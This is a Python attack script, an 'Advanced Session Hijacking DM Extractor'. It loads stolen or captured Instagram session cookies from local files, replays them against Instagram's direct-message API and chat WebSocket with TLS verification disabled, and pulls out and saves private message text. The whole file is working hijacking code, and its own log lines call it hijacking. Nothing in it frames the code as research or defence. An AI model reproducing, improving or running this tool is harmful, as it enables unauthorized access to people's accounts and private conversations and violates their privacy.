# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Advanced Session Hijacking DM Extractor 2025
=============================================
Targets active Instagram sessions to extract real DM content.
Uses advanced session manipulation and real-time content capture.
"""

import requests
import json
import time
import logging
import re
import random
import threading
from datetime import datetime
from pathlib import Path
import base64
import hashlib
from urllib.parse import urlencode, parse_qs, urlparse
import websocket
import ssl

# Setup logging
logging.basicConfig(
    level = logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/workspaces/sugarglitch-realops/logs/session_hijack_dm_extractor.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SessionHijackDMExtractor:
    def __init__(self):
        self.extracted_messages = []
        self.active_sessions = []
        self.hijacked_connections = []
        self.real_dm_found = False

    def load_and_analyze_sessions(self):
        """Load and analyze available session data"""
        session_files = [
            '/workspaces/sugarglitch-realops/tools/session_alx_trading.json',
            '/workspaces/sugarglitch-realops/alx_trading_session_fleming654.json',
            '/workspaces/sugarglitch-realops/demo_session.json'
        ]

        for session_file in session_files:
            if Path(session_file).exists():
                try:
                    with open(session_file, 'r') as f:
                        session_data = json.load(f)

                    # Analyze session quality
                    session_quality = self.analyze_session_quality(session_data)

                    self.active_sessions.append({
                        'file': session_file,
                        'data': session_data,
                        'quality': session_quality,
                        'last_used': time.time()
                    })

                    logger.info(f"Loaded session: {session_file} (Quality: {session_quality})")

                except Exception as e:
                    logger.error(f"Error loading session {session_file}: {e}")

        # Sort by quality
        self.active_sessions.sort(key = lambda x: x['quality'], reverse = True)
        return len(self.active_sessions) > 0

    def analyze_session_quality(self, session_data):
        """Analyze session data quality for DM extraction potential"""
        score = 0

        # Check for essential cookies
        if 'cookies' in session_data:
            cookies = session_data['cookies']
            essential_cookies = ['sessionid', 'csrftoken', 'ds_user_id', 'mid']

            for cookie in cookies:
                if isinstance(cookie, dict) and cookie.get('name') in essential_cookies:
                    score += 25

        # Check for headers
        if 'headers' in session_data:
            headers = session_data['headers']
            if 'X-CSRFToken' in headers or 'x-csrftoken' in headers:
                score += 10
            if 'Authorization' in headers:
                score += 15

        # Check for user data
        if 'user_id' in session_data or 'username' in session_data:
            score += 20

        return min(score, 100)

    def create_hijacked_session(self, session_data):
        """Create hijacked session with enhanced capabilities"""
        session = requests.Session()

        # Add all cookies
        if 'cookies' in session_data:
            for cookie in session_data['cookies']:
                if isinstance(cookie, dict):
                    session.cookies.set(
                        cookie.get('name', ''),
                        cookie.get('value', ''),
                        domain = cookie.get('domain', '.instagram.com'),
                        path = cookie.get('path', '/')
                    )

        # Enhanced headers for DM access
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q = 0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Requested-With': 'XMLHttpRequest',
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'X-Instagram-AJAX': '1',
            'Referer': 'https://www.instagram.com/direct/inbox/',
            'Origin': 'https://www.instagram.com'
        }

        # Add session-specific headers
        if 'headers' in session_data:
            headers.update(session_data['headers'])

        session.headers.update(headers)
        return session

    def extract_real_dm_endpoints(self, session):
        """Extract and test real DM endpoints"""
        dm_endpoints = [
            # Web endpoints
            'https://www.instagram.com/api/v1/direct_v2/inbox/?persistentBadging = true&folder=&limit = 20',
            'https://www.instagram.com/api/v1/direct_v2/threads/?use_unified_inbox = true',

            # Mobile endpoints
            'https://i.instagram.com/api/v1/direct_v2/inbox/',
            'https://i.instagram.com/api/v1/direct_v2/get_presence/',

            # GraphQL endpoints
            'https://www.instagram.com/graphql/query/',

            # Real-time endpoints
            'https://edge-chat.instagram.com/chat',
            'https://www.instagram.com/direct/inbox/general/'
        ]

        successful_endpoints = []

        for endpoint in dm_endpoints:
            try:
                logger.info(f"Testing DM endpoint: {endpoint}")

                response = session.get(endpoint, timeout = 15)

                if response.status_code == 200:
                    content = response.text

                    # Check if response contains DM data
                    if self.contains_dm_data(content):
                        successful_endpoints.append(endpoint)

                        # Extract messages from this endpoint
                        messages = self.extract_messages_from_content(content, endpoint)
                        if messages:
                            self.extracted_messages.extend(messages)
                            logger.info(f"✅ Extracted {len(messages)} messages from {endpoint}")

                time.sleep(random.uniform(1, 3))  # Random delay

            except Exception as e:
                logger.debug(f"Endpoint test failed {endpoint}: {e}")

        return successful_endpoints

    def contains_dm_data(self, content):
        """Check if content contains actual DM data"""
        dm_indicators = [
            '"thread_items"',
            '"direct_messages"',
            '"message_text"',
            '"text":"',
            '"item_text"',
            '"thread_id"',
            '"user_id"',
            '"timestamp"'
        ]

        content_lower = content.lower()
        indicator_count = sum(1 for indicator in dm_indicators if indicator.lower() in content_lower)

        return indicator_count >= 3  # Require multiple indicators

    def extract_messages_from_content(self, content, source_url):
        """Extract real message content from response"""
        messages = []

        # Try JSON parsing
        try:
            if content.strip().startswith(('{', '[')):
                data = json.loads(content)
                messages.extend(self.deep_message_extraction(data, source_url))
        except json.JSONDecodeError:
            pass

        # Regex extraction for real messages
        message_patterns = [
            r'"text":\s*"([^"]{3,1000})"',
            r'"item_text":\s*"([^"]{3,1000})"',
            r'"message":\s*"([^"]{3,1000})"',
            r'"content":\s*"([^"]{3,1000})"',
            r'"body":\s*"([^"]{3,1000})"'
        ]

        for pattern in message_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if self.is_real_message_text(match):
                    messages.append({
                        'text': match.strip(),
                        'source': 'session_hijack',
                        'url': source_url,
                        'extraction_method': 'regex',
                        'timestamp': datetime.now().isoformat(),
                        'confidence': 'high'
                    })
                    logger.info(f"🎯 REAL MESSAGE FOUND: {match[:60]}...")
                    self.real_dm_found = True

        return messages

    def deep_message_extraction(self, data, source_url):
        """Deep extraction from JSON data"""
        messages = []

        def recursive_search(obj, path="", depth = 0):
            if depth > 20:  # Prevent deep recursion
                return

            if isinstance(obj, dict):
                for key, value in obj.items():
                    if key.lower() in ['text', 'message', 'content', 'body', 'item_text']:
                        if isinstance(value, str) and self.is_real_message_text(value):
                            messages.append({
                                'text': value.strip(),
                                'source': 'session_hijack_json',
                                'url': source_url,
                                'path': f"{path}.{key}",
                                'extraction_method': 'json_deep',
                                'timestamp': datetime.now().isoformat(),
                                'confidence': 'very_high'
                            })
                            logger.info(f"🎯🎯 JSON MESSAGE: {value[:60]}...")
                            self.real_dm_found = True

                    elif isinstance(value, (dict, list)):
                        recursive_search(value, f"{path}.{key}", depth + 1)

            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    if isinstance(item, (dict, list)):
                        recursive_search(item, f"{path}[{i}]", depth + 1)

        recursive_search(data)
        return messages

    def is_real_message_text(self, text):
        """Enhanced check for real message content"""
        if not text or len(text) < 3:
            return False

        # More comprehensive metadata filter
        metadata_patterns = [
            r'^(null|undefined|true|false|\{\}|\[\])$',
            r'^[0-9a-f-]{8,}$',  # UUIDs/tokens
            r'^[A-Za-z0-9+/=]{20,}$',  # Base64
            r'(csrf|token|session|api|http|www\.|\.com)',
            r'(javascript|function|window|document)',
            r'(<|>|&lt;|&gt;)',  # HTML entities
            r'(application/|text/|image/)',  # MIME types
            r'^(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s',
            r'(bearer|oauth|authorization)',
            r'(error|success|failure|status)_(code|message)',
            r'instagram\.com|facebook\.com',
            r'__[a-zA-Z_]+__',  # Private variables
            r'^\s*[\{\[\]\}]\s*$'  # Just brackets
        ]

        text_clean = text.strip().lower()

        for pattern in metadata_patterns:
            if re.search(pattern, text_clean, re.IGNORECASE):
                return False

        # Positive indicators of real messages
        if (3 <= len(text) <= 2000 and  # Reasonable length
            ' ' in text and  # Contains spaces
            len(text.split()) >= 1 and  # Has words
            not text.startswith(('{', '[', '<')) and
            not text.endswith(('}', ']', '>')) and
            re.search(r'[a-zA-Z]', text)):  # Contains letters
            return True

        return False

    def hijack_websocket_connections(self, session_data):
        """Hijack WebSocket connections for real-time DM capture"""
        try:
            logger.info("🔗 Attempting WebSocket hijacking...")

            # WebSocket URLs to try
            ws_urls = [
                'wss://edge-chat.instagram.com/chat',
                'wss://www.instagram.com/ws/',
                'wss://edge-chat.instagram.com/ws'
            ]

            for ws_url in ws_urls:
                try:
                    # Create WebSocket connection with session cookies
                    headers = self.get_websocket_headers(session_data)

                    def on_message(ws, message):
                        try:
                            logger.info(f"📨 WebSocket message received")

                            # Try to extract messages from WebSocket data
                            if message:
                                extracted = self.extract_messages_from_content(message, ws_url)
                                if extracted:
                                    self.extracted_messages.extend(extracted)
                                    logger.info(f"✅ WebSocket extracted {len(extracted)} messages")
                        except Exception as e:
                            logger.debug(f"WebSocket message processing error: {e}")

                    def on_error(ws, error):
                        logger.debug(f"WebSocket error: {error}")

                    def on_close(ws, close_status_code, close_msg):
                        logger.info(f"WebSocket closed: {ws_url}")

                    # Create WebSocket connection
                    ws = websocket.WebSocketApp(
                        ws_url,
                        header = headers,
                        on_message = on_message,
                        on_error = on_error,
                        on_close = on_close
                    )

                    # Run WebSocket in thread for limited time
                    ws_thread = threading.Thread(
                        target = lambda: ws.run_forever(
                            sslopt={"cert_reqs": ssl.CERT_NONE},
                            ping_interval = 20,
                            ping_timeout = 10
                        )
                    )
                    ws_thread.daemon = True
                    ws_thread.start()

                    # Let it run for 30 seconds
                    time.sleep(30)
                    ws.close()

                except Exception as e:
                    logger.debug(f"WebSocket connection failed {ws_url}: {e}")

        except Exception as e:
            logger.error(f"WebSocket hijacking error: {e}")

    def get_websocket_headers(self, session_data):
        """Get WebSocket headers with session data"""
        headers = []

        # Add session cookies as header
        if 'cookies' in session_data:
            cookie_str = '; '.join([
                f"{c.get('name', '')}={c.get('value', '')}"
                for c in session_data['cookies']
                if isinstance(c, dict) and c.get('name') and c.get('value')
            ])
            if cookie_str:
                headers.append(f"Cookie: {cookie_str}")

        # Add other headers
        headers.extend([
            "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Origin: https://www.instagram.com",
            "Sec-WebSocket-Protocol: graphql-ws"
        ])

        return headers

    def run_hijacking_extraction(self):
        """Main hijacking extraction process"""
        try:
            logger.info("🏴‍☠️ Starting Advanced Session Hijacking DM Extraction...")

            if not self.load_and_analyze_sessions():
                logger.error("No valid sessions found for hijacking")
                return

            # Use best quality session
            best_session = self.active_sessions[0]
            logger.info(f"Using session: {best_session['file']} (Quality: {best_session['quality']})")

            # Create hijacked session
            hijacked_session = self.create_hijacked_session(best_session['data'])

            # Extract from endpoints
            successful_endpoints = self.extract_real_dm_endpoints(hijacked_session)
            logger.info(f"Successfully accessed {len(successful_endpoints)} DM endpoints")

            # Try WebSocket hijacking
            self.hijack_websocket_connections(best_session['data'])

            # Try other sessions if first didn't yield results
            if not self.real_dm_found and len(self.active_sessions) > 1:
                logger.info("🔄 Trying additional sessions...")
                for session_info in self.active_sessions[1:3]:  # Try up to 3 more
                    hijacked_session = self.create_hijacked_session(session_info['data'])
                    self.extract_real_dm_endpoints(hijacked_session)
                    if self.real_dm_found:
                        break

        except Exception as e:
            logger.error(f"Hijacking extraction error: {e}")

    def save_results(self):
        """Save hijacking extraction results"""
        try:
            timestamp = int(time.time())
            results_file = f'/workspaces/sugarglitch-realops/results/session_hijack_dm_extraction_{timestamp}.json'

            Path(results_file).parent.mkdir(parents = True, exist_ok = True)

            results = {
                'extraction_method': 'session_hijacking',
                'timestamp': timestamp,
                'execution_time': datetime.now().isoformat(),
                'sessions_analyzed': len(self.active_sessions),
                'real_messages_found': len([m for m in self.extracted_messages if m.get('confidence') in ['high', 'very_high']]),
                'total_extractions': len(self.extracted_messages),
                'extracted_messages': self.extracted_messages,
                'summary': {
                    'hijacking_successful': self.real_dm_found,
                    'real_content_found': self.real_dm_found,
                    'session_qualities': [s['quality'] for s in self.active_sessions]
                }
            }

            with open(results_file, 'w') as f:
                json.dump(results, f, indent = 2)

            logger.info(f"Results saved to: {results_file}")
            return results_file

        except Exception as e:
            logger.error(f"Error saving results: {e}")
            return None

def main():
    """Main execution function"""
    extractor = SessionHijackDMExtractor()

    try:
        extractor.run_hijacking_extraction()
        results_file = extractor.save_results()

        # Display results
        print("\n" + "="*70)
        print("🏴‍☠️ SESSION HIJACKING DM EXTRACTION RESULTS")
        print("="*70)
        print(f"📊 Sessions Analyzed: {len(extractor.active_sessions)}")
        print(f"💬 Real Messages Found: {len([m for m in extractor.extracted_messages if m.get('confidence') in ['high', 'very_high']])}")
        print(f"📋 Total Extractions: {len(extractor.extracted_messages)}")
        print(f"🎯 Real Content Found: {'YES' if extractor.real_dm_found else 'NO'}")

        if extractor.real_dm_found:
            print("\n✅ REAL DM CONTENT SUCCESSFULLY EXTRACTED:")
            real_messages = [m for m in extractor.extracted_messages if m.get('confidence') in ['high', 'very_high']]
            for i, msg in enumerate(real_messages[:5]):
                print(f"  {i+1}. {msg['text'][:80]}...")
                print(f"     Confidence: {msg['confidence']} | Source: {msg['source']}")
        else:
            print("\n❌ NO REAL DM CONTENT FOUND")
            print("   📋 Session hijacking completed but only metadata extracted")

        if results_file:
            print(f"\n📁 Full results: {results_file}")

        print("="*70)

    except KeyboardInterrupt:
        logger.info("Extraction interrupted by user")
    except Exception as e:
        logger.error(f"Main execution error: {e}")

if __name__ == "__main__":
    main()
